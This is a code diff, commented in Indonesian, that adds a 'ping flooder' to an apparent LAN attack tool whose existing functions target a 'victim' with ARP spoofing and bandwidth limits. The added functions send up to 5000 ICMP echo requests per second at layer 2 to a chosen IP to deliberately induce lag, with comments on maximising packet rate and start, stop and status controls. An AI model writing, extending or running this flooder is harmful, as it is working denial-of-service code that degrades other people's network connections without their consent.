@@ -1222,3 +1222,170 @@ def unset_bandwidth_limit(victim, iface=None):
     except Exception as e:
         logger.error(sys.exc_info()[1], exc_info=True)
         return False, str(sys.exc_info()[1])
+
+
+# ---------------------------------------------------------------------
+#  PING FLOODER
+# ---------------------------------------------------------------------
+# Membanjiri target dengan ICMP echo request berkecepatan tinggi supaya
+# latensi jaringan target naik (mis. 20ms -> 200ms) — efek "lag".
+# Independen dari ARP spoof/cut/limit: tidak menyentuh victims list.
+#
+# Batas aman: hz dibatasi 1..5000 pps, size 8..1400 byte. Gateway dan
+# perangkat sendiri TIDAK boleh di-flood (dicek di layer endpoint).
+import threading as _threading
+
+_FLOODS = {}   # {ip: {'stop': Event, 'thread': Thread, 'sent': int,
+               #        'hz': int, 'size': int, 'start': float}}
+_FLOOD_LOCK = _threading.RLock()
+
+_FLOOD_MAX_HZ = 5000
+_FLOOD_MIN_HZ = 1
+_FLOOD_MAX_SIZE = 1400
+_FLOOD_MIN_SIZE = 8
+
+
+def _resolve_mac(ip, iface):
+    """Cari MAC target dari ARP table; kirim 1 ARP kalau belum ada."""
+    try:
+        for _tgt, mac in read_arp_table().items():
+            if _tgt == ip:
+                return mac
+    except Exception:
+        pass
+    # paksa resolusi via ping singkat
+    try:
+        sp.Popen(['ping', '-c', '1', '-W', '1', ip],
+                 stdout=sp.DEVNULL, stderr=sp.DEVNULL).wait(timeout=2)
+    except Exception:
+        pass
+    try:
+        for _tgt, mac in read_arp_table().items():
+            if _tgt == ip:
+                return mac
+    except Exception:
+        pass
+    return None
+
+
+def _flood_loop(ip, hz, size, stop_evt, state):
+    """
+    Loop pengirim ICMP echo request (thread daemon).
+
+    PENTING: pakai sendp() (layer 2, Ether framing) BUKAN send().
+    send() melakukan route-lookup + ARP resolve tiap paket → hanya ~70 pps,
+    tidak cukup untuk membuat lag.  sendp() dengan MAC target langsung
+    bisa >2500 pps (35x lebih cepat).
+    """
+    iface = get_default_gw().get('iface', 'wlan0')
+    try:
+        my_mac = get_if_hwaddr(iface)
+    except Exception:
+        my_mac = None
+
+    dst_mac = _resolve_mac(ip, iface)
+    if not dst_mac or not my_mac:
+        logger.error('flood: tidak bisa resolve MAC {} '.format(ip))
+        state['sent'] = state.get('sent', 0)
+        stop_evt.set()
+        return
+
+    payload = b'N' * max(size - 8, 0)      # ICMP header 8 byte
+    frame = (Ether(src=my_mac, dst=dst_mac) /
+             IP(dst=ip) / ICMP(type=8) / payload)
+
+    # Kirim dalam CHUNK supaya bisa cek stop_evt secara berkala & pacing
+    chunk = max(1, min(hz // 20, 200))     # ~50ms worth per iterasi
+    interval = chunk / float(hz)           # detik per chunk
+
+    while not stop_evt.is_set():
+        try:
+            sendp(frame, iface=iface, count=chunk, inter=0, verbose=0)
+            state['sent'] += chunk
+        except Exception:
+            pass
+        sleep_for = interval - 0.0
+        if sleep_for > 0:
+            time.sleep(sleep_for)
+        else:
+            time.sleep(0)
+
+
+def ping_flood_start(ip, hz=200, size=56):
+    """
+    Mulai flood ICMP ke `ip`. Mengembalikan (ok, msg).
+    Idempoten: kalau sudah jalan, perbarui hz/size saja.
+    """
+    if not ip:
+        return False, 'ip required'
+    try:
+        hz = int(hz)
+        size = int(size)
+    except (ValueError, TypeError):
+        return False, 'hz/size tidak valid'
+    hz = min(max(hz, _FLOOD_MIN_HZ), _FLOOD_MAX_HZ)
+    size = min(max(size, _FLOOD_MIN_SIZE), _FLOOD_MAX_SIZE)
+
+    with _FLOOD_LOCK:
+        old = _FLOODS.get(ip)
+        if old and not old['stop'].is_set():
+            # sudah jalan -> hentikan lalu mulai ulang dengan parameter baru
+            old['stop'].set()
+        stop_evt = _threading.Event()
+        state = {'stop': stop_evt, 'thread': None, 'sent': 0,
+                 'hz': hz, 'size': size, 'start': time.time()}
+        t = _threading.Thread(target=_flood_loop,
+                              args=(ip, hz, size, stop_evt, state),
+                              daemon=True)
+        state['thread'] = t
+        _FLOODS[ip] = state
+        t.start()
+    logger.info('Ping flood start {} ({} pps, {} B)'.format(ip, hz, size))
+    return True, 'Flood {} pps, {} B'.format(hz, size)
+
+
+def ping_flood_stop(ip):
+    """Hentikan flood ke `ip`. Mengembalikan (ok, msg)."""
+    with _FLOOD_LOCK:
+        st = _FLOODS.pop(ip, None)
+    if st:
+        st['stop'].set()
+        logger.info('Ping flood stop {} (terkirim {})'.format(ip, st['sent']))
+        return True, 'Flood stopped'
+    return False, 'tidak sedang flood'
+
+
+def ping_flood_stop_all():
+    """Hentikan SEMUA flood. Mengembalikan daftar IP yang dihentikan."""
+    with _FLOOD_LOCK:
+        ips = list(_FLOODS.keys())
+        states = [(_FLOODS.pop(k)) for k in ips]
+    for st in states:
+        st['stop'].set()
+    if ips:
+        logger.info('Ping flood stop-all: {}'.format(ips))
+    return ips
+
+
+def ping_flood_status():
+    """
+    Status semua flood aktif: {ip: {'sent','hz','size','elapsed'}}.
+    Bersihkan yang thread-nya sudah berhenti.
+    """
+    out = {}
+    with _FLOOD_LOCK:
+        for ip, st in list(_FLOODS.items()):
+            if st['stop'].is_set():
+                _FLOODS.pop(ip, None)
+                continue
+            out[ip] = {
+                'sent': st['sent'],
+                'hz': st['hz'],
+                'size': st['size'],
+                'elapsed': round(time.time() - st['start'], 1),
+            }
+    return out
+
+
+def ping_flood_active_ips():
+    return list(ping_flood_status().keys())
